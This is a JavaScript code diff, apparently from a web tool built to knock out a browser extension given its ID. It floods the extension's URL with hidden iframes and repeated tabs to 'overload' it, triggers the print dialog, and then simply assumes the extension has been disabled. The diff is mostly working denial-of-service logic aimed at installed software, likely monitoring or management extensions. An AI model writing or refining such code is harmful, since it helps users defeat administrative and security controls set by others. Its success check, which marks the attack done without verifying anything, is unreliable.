@@ -237,33 +237,42 @@
             const extUrl = `chrome-extension://${extId}/`;
             let success = false;
 
-            // Step 1: Create a large number of iframes to overload the extension
+            // Step 1: Open the extension URL in a new tab
+            const newTab = window.open(extUrl, '_blank');
+            if (!newTab) {
+                addToHistory(`Failed to open ${extName} in a new tab. Please allow popups.`);
+                return;
+            }
+
+            // Step 2: Create a large number of iframes to overload the extension
             const iframeContainer = document.createElement('div');
             iframeContainer.style.display = 'none'; // Hide the iframes
             document.body.appendChild(iframeContainer);
 
             for (let i = 0; i < iframeCount; i++) {
-                const iframe = document.createElement('iframe');
-                iframe.src = extUrl;
-                iframe.width = "25px";
-                iframe.height = "25px";
-                iframe.style.border = "none";
-                iframeContainer.appendChild(iframe);
+                setTimeout(() => {
+                    const iframe = document.createElement('iframe');
+                    iframe.src = extUrl;
+                    iframe.width = "25px";
+                    iframe.height = "25px";
+                    iframe.style.border = "none";
+                    iframeContainer.appendChild(iframe);
+                }, i * 10); // Add a small delay between iframe creation
             }
 
-            // Step 2: Open multiple tabs to further stress the extension
+            // Step 3: Open multiple tabs to further stress the extension
             for (let i = 0; i < tabCount; i++) {
                 setTimeout(() => {
                     window.open(extUrl, '_blank');
                 }, i * 1000); // Delay between opening tabs
             }
 
-            // Step 3: Trigger the print dialog
+            // Step 4: Trigger the print dialog
             setTimeout(() => {
                 window.print(); // Trigger the print dialog
             }, 1000);
 
-            // Step 4: Check if the extension is disabled
+            // Step 5: Check if the extension is disabled
             setTimeout(() => {
                 iframeContainer.remove(); // Remove the iframes
                 success = true; // Assume the extension is disabled
